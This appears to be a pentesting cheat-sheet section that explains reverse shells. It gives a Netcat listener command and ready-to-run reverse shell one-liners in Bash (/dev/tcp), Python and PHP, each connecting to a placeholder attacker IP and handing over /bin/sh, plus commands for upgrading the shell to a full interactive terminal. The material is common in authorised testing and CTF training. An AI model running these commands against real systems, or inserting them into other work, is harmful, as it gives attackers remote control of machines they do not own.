- ### Reverse Shell
  A Reverse Shell is a type of connection where a target machine initiates a remote shell back to an attacker's system, allowing the attacker to execute
  commands on the target as if they were locally present. It can be easily achieved using [Netcat](https://nmap.org/ncat/).

  On your Local Machine, run the following command to start a Netcat listener on a specific port.
  ```bash
  nc -lvnp ${PORT}
  ```
  
  Afterwards on the Remote Machine, run one of the following commands to create the Reverse Shell.
  - #### Bash
    ```bash
    bash -i >& /dev/tcp/${LOCAL_MACHINE_IP}/${PORT} 0>&1
    ```
  
  - #### Python
    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR.IP.ADDR.HERE",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
    ```

  - #### PHP
    ```php
    <?php
      $ip='LOCAL_MACHINE_IP'; $port=PORT;
      $s=fsockopen($ip,$port);
      $proc=proc_open('/bin/sh', [$s,$s,$s], $pipes);
      proc_close($proc);
    ?>
    ```
  
<br/>

- ### Bash Spawn <br/>
  Spawns an interactive pseudo-terminal **(pty)** running **/bin/bash**, which upgrades a basic shell to behave more like a fully interactive terminal.
  Useful when doing a Reverse Shell.

  - #### Simple
    ```bash
    script /dev/null -c bash
    ```

  - #### Full
    ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    <CTRL+Z>
    stty raw -echo; fg
    export TERM=xterm
    ```  
